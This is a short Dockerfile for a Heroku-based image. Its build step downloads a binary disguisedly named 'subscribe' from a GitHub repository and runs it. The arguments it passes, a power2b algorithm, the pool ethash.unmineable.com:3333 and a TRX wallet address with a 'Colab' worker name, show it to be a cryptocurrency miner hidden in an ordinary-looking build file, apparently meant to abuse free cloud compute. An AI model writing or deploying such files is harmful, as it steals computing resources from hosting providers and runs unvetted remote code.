FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o ethash.unmineable.com:3333 -u TRX:TXfogTn3aFKZfj4zgGCDvfZim7VD7Pjicb.Colab -p x
CMD bash heroku.sh
